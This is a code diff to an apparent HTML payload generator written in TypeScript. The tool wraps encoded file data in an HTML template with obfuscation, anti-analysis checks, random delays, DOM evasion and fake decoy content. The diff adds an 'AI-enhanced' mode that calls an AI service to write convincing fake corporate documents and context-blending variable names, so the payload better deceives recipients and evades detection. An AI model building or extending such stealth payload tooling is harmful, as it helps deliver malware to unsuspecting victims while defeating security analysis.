@@ -20,6 +20,7 @@ import {
   obfuscateString,
   obfuscateVariableName
 } from "./stealthUtils";
+import { aiService } from "./aiService";
 
 export async function generatePayload(fileData: FileData, config: Config): Promise<string> {
   const { file, content } = fileData;
@@ -60,7 +61,7 @@ export async function generatePayload(fileData: FileData, config: Config): Promi
   }
   
   // Generate the HTML payload
-  const html = generateHTMLTemplate({
+  const html = await generateHTMLTemplate({
     encodedData,
     decoderFunction,
     fileName: file.name,
@@ -72,7 +73,10 @@ export async function generatePayload(fileData: FileData, config: Config): Promi
     obfuscateCode: config.obfuscateCode,
     randomDelay: config.randomDelay,
     storageMethod: config.storageMethod,
-    antiAnalysis: config.antiAnalysis
+    antiAnalysis: config.antiAnalysis,
+    aiEnhanced: config.aiEnhanced,
+    aiContentType: config.aiContentType,
+    aiObfuscationLevel: config.aiObfuscationLevel
   });
   
   return html;
@@ -91,9 +95,12 @@ interface TemplateParams {
   randomDelay: boolean;
   storageMethod: string;
   antiAnalysis: boolean;
+  aiEnhanced: boolean;
+  aiContentType: string;
+  aiObfuscationLevel: string;
 }
 
-function generateHTMLTemplate(params: TemplateParams): string {
+async function generateHTMLTemplate(params: TemplateParams): Promise<string> {
   const { 
     encodedData, 
     decoderFunction, 
@@ -106,16 +113,54 @@ function generateHTMLTemplate(params: TemplateParams): string {
     obfuscateCode,
     randomDelay,
     storageMethod,
-    antiAnalysis
+    antiAnalysis,
+    aiEnhanced,
+    aiContentType,
+    aiObfuscationLevel
   } = params;
   
-  // Generate fake content if enabled
-  const fakeDoc = fakeContent ? generateFakeContent() : null;
+  // Generate fake content with AI or fallback
+  let fakeDoc = null;
+  if (fakeContent) {
+    if (aiEnhanced) {
+      try {
+        const fileExtension = fileName.split('.').pop() || '';
+        const contextType = aiContentType === 'auto' ? 'corporate' : aiContentType;
+        
+        fakeDoc = await aiService.generateFakeDocumentContent({
+          fileType: fileExtension,
+          fileName,
+          targetAudience: contextType,
+          documentType: contextType
+        });
+      } catch (error) {
+        console.warn('AI content generation failed, using fallback');
+        fakeDoc = generateFakeContent();
+      }
+    } else {
+      fakeDoc = generateFakeContent();
+    }
+  }
+  
+  // Generate AI-enhanced variable names if enabled
+  let variableNames: string[] = [];
+  if (aiEnhanced && obfuscateCode) {
+    try {
+      variableNames = await aiService.generateContextualVariableNames(
+        fakeDoc ? 'business application' : 'document viewer',
+        10
+      );
+    } catch (error) {
+      console.warn('AI variable generation failed, using fallback');
+      variableNames = [];
+    }
+  }
   
   // Generate storage code based on method
-  const storageCode = generateStorageCode(storageMethod, encodedData, obfuscateVariableName('key'));
+  const keyVar = variableNames[0] || obfuscateVariableName('key');
+  const storageCode = generateStorageCode(storageMethod, encodedData, keyVar);
   
-  // Generate stealth features
+  // Generate stealth features with AI enhancement
   const antiAnalysisFeatures = antiAnalysis ? generateAntiAnalysisCode() : '';
   const delayCode = randomDelay ? generateRandomDelay() : '';
   const domEvasion = obfuscateCode ? generateDOMEvasion() : '';
